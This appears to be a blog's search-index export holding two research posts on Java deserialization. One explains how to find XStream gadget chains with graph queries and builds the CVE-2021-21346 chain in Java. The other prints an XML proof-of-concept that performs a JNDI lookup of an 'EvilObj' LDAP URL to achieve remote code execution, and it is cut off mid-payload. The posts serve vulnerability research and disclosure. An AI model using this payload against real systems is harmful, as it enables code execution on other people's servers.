<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>如何高效的挖掘Java反序列化利用链？</title>
      <link href="2021/03/14/java-how-to-find-gadget-chains/"/>
      <url>2021/03/14/java-how-to-find-gadget-chains/</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="#1 前言"></a>#1 前言</h1><p>Java反序列化利用链一直都是国内外研究热点之一，但当前自动化方案gadgetinspector的效果并不好。所以目前多数师傅仍然是以人工+自研小工具的方式进行利用链的挖掘。目前我个人也在找一个合适的方法来高效挖掘利用链，本文将主要介绍我自己的一些挖掘心得，辅以XStream反序列化利用链CVE-2021-21346为例。</p><a id="more"></a><h1 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="#1 前置知识"></a>#1 前置知识</h1><p>这里前置知识主要有两类：XStream反序列化利用链的原理和图数据库查询语法</p><ol><li><p>XStream反序列化利用链原理</p><p>这里具体的原理可以见<a href="https://www.anquanke.com/post/id/204314" target="_blank" rel="noopener">回顾XStream反序列化漏洞</a>，这里我们只需知道XStream在反序列化的过程中它的限制是很少的（不用PureJavaReflectionProvider），它甚至能还原构造好的Method对象。所以这里我们需要清楚的是它的触发函数source是什么，看我上面那篇文章能知道共有hashCode函数（Map方式）、compareTo函数（TreeSet方式）、compare函数（PriorityQueue方式）。</p></li><li><p>图数据库查询语法</p><p>这里用到了我即将开源的工具<a href="https://github.com/wh1t3p1g/tabby" target="_blank" rel="noopener">tabby</a>，该工具将jar文件转化为代码属性图，然后后续我们可以用neo4j的图数据库查询语法进行利用链的查找，所以我们需要有一定的图数据库查询语法的<a href="https://neo4j.com/docs/cypher-manual/current/" target="_blank" rel="noopener">基础</a></p></li></ol><h1 id="2-利用链挖掘"><a href="#2-利用链挖掘" class="headerlink" title="#2 利用链挖掘"></a>#2 利用链挖掘</h1><p>首先本次针对的是JDK相关Jar文件的利用链检测分析，所以先使用tabby生成JDK相关的代码属性图至图数据库。执行完以下两句命令，可以生成一个28w数据节点，76w关系边的代码属性图：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成图缓存文件</span></span><br><span class="line">java -Xmx6g -jar target/tabby-1.0.0-SNAPSHOT.jar --isJDKOnly</span><br><span class="line"><span class="comment"># 导入Neo4j图数据</span></span><br><span class="line">java -Xmx6g -jar target/tabby-1.0.0-SNAPSHOT.jar --isSaveOnly</span><br></pre></td></tr></table></figure><p>接下来，构造图查询语言，这里提供一个模版</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) // 添加where语句限制source函数</span><br><span class="line">match (sink:Method &#123;IS_SINK:true&#125;) // 添加where语句限制sink函数</span><br><span class="line"><span class="keyword">call</span> apoc.algo.allSimplePaths(m1, <span class="keyword">source</span>, <span class="string">"&lt;CALL|ALIAS"</span>, <span class="number">12</span>) yield <span class="keyword">path</span> // 查找具体路径,<span class="number">12</span>代表深度，可以修改</span><br><span class="line"><span class="keyword">return</span> * <span class="keyword">limit</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><p>当前我们已经确定了当前可以使用hashCode函数、compareTo函数、compare函数作为source函数，那么只要再限制sink函数即可，如下查询语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;compare&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;IS_SINK:true, NAME:&quot;invoke&quot;&#125;)&lt;-[:CALL]-(m1:Method)</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 20) yield path </span><br><span class="line">return * limit 20</span><br></pre></td></tr></table></figure><p>本次利用链将限制危险函数为Method.invoke函数，具体查询结果如下图所示</p><p><img src="/images/how_to_find_gadget_chains/image-20210313232310869.png" alt="image-20210313232310869"></p><p>可以看到末端的危险函数调用点为<code>sun.swing.SwingLazyValue#createValue</code>，来看一下具体的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">createValue</span><span class="params">(<span class="keyword">final</span> UIDefaults table)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectUtil.checkPackageAccess(className);</span><br><span class="line">        Class&lt;?&gt; c = Class.forName(className, <span class="keyword">true</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (methodName != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Class[] types = getClassArray(args);</span><br><span class="line">            Method m = c.getMethod(methodName, types);</span><br><span class="line">            makeAccessible(m);</span><br><span class="line">            <span class="keyword">return</span> m.invoke(c, args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Class[] types = getClassArray(args);</span><br><span class="line">            Constructor constructor = c.getConstructor(types);</span><br><span class="line">            makeAccessible(constructor);</span><br><span class="line">            <span class="keyword">return</span> constructor.newInstance(args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// Ideally we would throw an exception, unfortunately</span></span><br><span class="line">        <span class="comment">// often times there are errors as an initial look and</span></span><br><span class="line">        <span class="comment">// feel is loaded before one can be switched. Perhaps a</span></span><br><span class="line">        <span class="comment">// flag should be added for debugging, so that if true</span></span><br><span class="line">        <span class="comment">// the exception would be thrown.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码上看，该函数可以调用任意的静态函数或任意对象的构造函数。那么我们就先确定当前这个函数是否是可用的，即找到合适的静态函数或构造函数，该函数会调用某些危险函数从而达成代码执行或命令执行。这里也同样构造图查询语句进行合适函数的查找，暂时限定危险函数为<code>exec</code>、<code>lookup</code>、<code>invoke</code>。</p><p><img src="/images/how_to_find_gadget_chains/image-20210314000451728.png" alt="image-20210314000451728"></p><p>找到了一个可以用的函数<code>&lt;javax.naming.InitialContext: java.lang.Object doLookup(java.lang.String)&gt;</code>，该静态函数可以进行JNDI注入攻击。</p><p>所以到这里我们就能确定当前的<code>sun.swing.SwingLazyValue#createValue</code>是可以利用的节点。</p><p>那么根据前一个查询结果，我们继续进行分析<code>javax.swing.UIDefaults#getFromHashtable</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">getFromHashtable</span><span class="params">(<span class="keyword">final</span> Object key)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* Quickly handle the common case, without grabbing</span></span><br><span class="line"><span class="comment">         * a lock.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Object value = <span class="keyword">super</span>.get(key);</span><br><span class="line">        </span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* At this point we know that the value of key was</span></span><br><span class="line"><span class="comment">         * a LazyValue or an ActiveValue.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (value <span class="keyword">instanceof</span> LazyValue) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">/* If an exception is thrown we'll just put the LazyValue</span></span><br><span class="line"><span class="comment">                 * back in the table.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                value = ((LazyValue)value).createValue(<span class="keyword">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">         <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>javax.swing.UIDefaults</code>是<code>Hashtable&lt;Object,Object&gt;</code>的另一个实现，所以这里<code>super.get(key)</code>获取到的value值对于我们来说是可以任意填充的，那么此处填充前面的<code>sun.swing.SwingLazyValue</code>对象即可触发<code>createValue</code>函数的调用。</p><p>从<code>getFromHashtable</code>函数开始，调用对象的情况开始变多了起来，此时需要对每一条进行分别分析，但多数情况简单看一下就能确定当前的传递情况是否可延续。</p><p>此处，我就直接讲CVE-2021-21346的利用链。</p><p><code>javax.swing.UIDefaults#get</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Object value = getFromHashtable( key );</span><br><span class="line">    <span class="keyword">return</span> (value != <span class="keyword">null</span>) ? value : getFromResourceBundle(key, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>get</code>函数延续了key的传递，继续往上分析</p><p><code>javax.swing.MultiUIDefaults#get</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Object value = <span class="keyword">super</span>.get(key);</span><br><span class="line">    <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (UIDefaults table : tables) &#123;</span><br><span class="line">        value = (table != <span class="keyword">null</span>) ? table.get(key) : <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数有两处地方调用了<code>javax.swing.UIDefaults#get</code>分别是第3行、第9行，所以在写poc的时候，可以直接替换类属性tables或hashtable本身的value值也可以。</p><p>继续向上，<code>javax.swing.MultiUIDefaults#toString</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StringBuffer buf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    buf.append(<span class="string">"&#123;"</span>);</span><br><span class="line">    Enumeration keys = keys();</span><br><span class="line">    <span class="keyword">while</span> (keys.hasMoreElements()) &#123;</span><br><span class="line">        Object key = keys.nextElement();</span><br><span class="line">        buf.append(key + <span class="string">"="</span> + get(key) + <span class="string">", "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> length = buf.length();</span><br><span class="line">    <span class="keyword">if</span> (length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        buf.delete(length-<span class="number">2</span>, length);</span><br><span class="line">    &#125;</span><br><span class="line">    buf.append(<span class="string">"&#125;"</span>);</span><br><span class="line">    <span class="keyword">return</span> buf.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>toString函数遍历了当前hashtable所存储的内容，自然这里也就调用到了<code>javax.swing.MultiUIDefaults#get</code>函数（第7行）。</p><p>所以到此为止，我们有从toString函数到invoke函数的调用链了。</p><p>接下来就是找到触发函数到toString函数的调用链了，这里为了查询结果更为清晰，我们只查询从触发函数到toString函数的利用链情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compareTo&quot;]</span><br><span class="line">match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)&lt;-[r:CALL]-(m1:Method) where r.REAL_CALL_TYPE in [&quot;java.lang.Object&quot;]</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 6) yield path </span><br><span class="line">return * limit 20</span><br></pre></td></tr></table></figure><p>这里比较难受的是三个触发函数和toString函数都是有大量实现的函数，所以如果要找到一条可用的得看不少时间。下图简单处理了一下（图中画的箭头只是一种可能性）</p><p><img src="/images/how_to_find_gadget_chains/image-20210314144816234.png" alt="image-20210314144816234"></p><p>此处我们从compareTo开始讲，<code>javax.naming.ldap.Rdn$RdnEntry#compareTo</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(RdnEntry that)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> diff = type.compareToIgnoreCase(that.type);</span><br><span class="line">    <span class="keyword">if</span> (diff != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> diff;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (value.equals(that.value)) &#123;     <span class="comment">// try shortcut</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getValueComparable().compareTo(</span><br><span class="line">                that.getValueComparable());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的类属性value发起了equals函数，往下看<code>com.sun.org.apache.xpath.internal.objects.XString#equals</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj2)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == obj2)</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// In order to handle the 'all' semantics of</span></span><br><span class="line">      <span class="comment">// nodeset comparisons, we always call the</span></span><br><span class="line">      <span class="comment">// nodeset function.</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (obj2 <span class="keyword">instanceof</span> XNodeSet)</span><br><span class="line">      <span class="keyword">return</span> obj2.equals(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(obj2 <span class="keyword">instanceof</span> XNumber)</span><br><span class="line">        <span class="keyword">return</span> obj2.equals(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> str().equals(obj2.toString());</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里直接调用了obj2的toString函数，所以连上前面的利用链完整的利用链就出来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">    com.sun.org.apache.xpath.internal.objects.XString.equal</span><br><span class="line">        javax.swing.MultiUIDefaults.toString</span><br><span class="line">            UIDefaults.get</span><br><span class="line">                UIDefaults.getFromHashTable</span><br><span class="line">                    UIDefaults$LazyValue.createValue</span><br><span class="line">                    SwingLazyValue.createValue</span><br><span class="line">                        javax.naming.InitialContext.doLookup()</span><br></pre></td></tr></table></figure><p>至此，CVE-2021-21346就挖出来了，相对于人工挖，当前的方法大幅度减少了利用链的可能性种类，同样，另一条CVE-2021-21351也是同样的方法可以发现，以后有空再补充些其他的案例:)</p><h1 id="3-利用链构造"><a href="#3-利用链构造" class="headerlink" title="#3 利用链构造"></a>#3 利用链构造</h1><p>当前这条利用链的构造相对来说比较简单，只需要构造好MultiUIDefaults即可，下面为部分构造代码，详细见<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/payload/xstream/LazyValue.java#L60" target="_blank" rel="noopener">LazyValue</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">UIDefaults uiDefaults = <span class="keyword">new</span> UIDefaults();</span><br><span class="line">Object multiUIDefaults =</span><br><span class="line">  ReflectionHelper.newInstance(<span class="string">"javax.swing.MultiUIDefaults"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> UIDefaults[]&#123;uiDefaults&#125;&#125;);</span><br><span class="line">uiDefaults.put(<span class="string">"lazyValue"</span>, obj);</span><br><span class="line"></span><br><span class="line">Object rdnEntry1 = ReflectionHelper.newInstance(<span class="string">"javax.naming.ldap.Rdn$RdnEntry"</span>, <span class="keyword">null</span>);</span><br><span class="line">ReflectionHelper.setFieldValue(rdnEntry1, <span class="string">"type"</span>, <span class="string">"ysomap"</span>);</span><br><span class="line">ReflectionHelper.setFieldValue(rdnEntry1, <span class="string">"value"</span>, <span class="keyword">new</span> XString(<span class="string">"test"</span>));</span><br><span class="line"></span><br><span class="line">Object rdnEntry2 = ReflectionHelper.newInstance(<span class="string">"javax.naming.ldap.Rdn$RdnEntry"</span>, <span class="keyword">null</span>);</span><br><span class="line">ReflectionHelper.setFieldValue(rdnEntry2, <span class="string">"type"</span>, <span class="string">"ysomap"</span>);</span><br><span class="line">ReflectionHelper.setFieldValue(rdnEntry2, <span class="string">"value"</span>, multiUIDefaults);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);</span><br></pre></td></tr></table></figure><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="#4 总结"></a>#4 总结</h1><p>13号的时候XStream发布了1.4.16，共修复了11个CVE，其中还比较有意思的是threedr3am的classloader的利用方式，以及钟潦贵师傅的CVE-2021-21345（这条利用链很长，我当前只用tabby做了12个节点的查找，这条链大概有20个节点，嗯，很长）。相信这波完了之后，估计还能找到一些漏网之鱼XD</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XStream 1.4.15 Blacklist Bypass</title>
      <link href="2021/01/03/java-xstream-blacklist-bypass/"/>
      <url>2021/01/03/java-xstream-blacklist-bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Gadget-Overview"><a href="#1-Gadget-Overview" class="headerlink" title="#1 Gadget Overview"></a>#1 Gadget Overview</h1><p>Recently, I found a new deserialzation gadget which can bypass the latest version of XStream. This gadget use the JDK to construct the gadget chain. I had tested the gadget chain to RCE (remote code execute) with the version of JDK8 (8u162). I think other version of JDK also could trigger this vulnerablity to the RCE.</p><a id="more"></a><p>Let’s look at this gadget, and the detail is in part #3. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TreeSet.putAll</span><br><span class="line">javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">    com.sun.org.apache.xpath.internal.objects.XString.equal</span><br><span class="line">        javax.swing.MultiUIDefaults.toString</span><br><span class="line">            UIDefaults.get</span><br><span class="line">                UIDefaults.getFromHashTable</span><br><span class="line">                    UIDefaults$LazyValue.createValue</span><br><span class="line">                    SwingLazyValue.createValue</span><br><span class="line">                        javax.naming.InitialContext.doLookup()</span><br></pre></td></tr></table></figure><h1 id="2-Poc"><a href="#2-Poc" class="headerlink" title="#2 Poc"></a>#2 Poc</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">"javax.swing.MultiUIDefaults"</span> <span class="attr">serialization</span>=<span class="string">"custom"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">defaultLocale</span>&gt;</span>zh_CN<span class="tag">&lt;/<span class="name">defaultLocale</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">tables</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span> <span class="attr">serialization</span>=<span class="string">"custom"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>lazyValue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">className</span>&gt;</span>javax.naming.InitialContext<span class="tag">&lt;/<span class="name">className</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>doLookup<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>ldap://localhost:1099/EvilObj<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">args</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultLocale</span> <span class="attr">reference</span>=<span class="string">"../../../../../../../javax.swing.UIDefaults/default/defaultLocale"</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">tables</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span 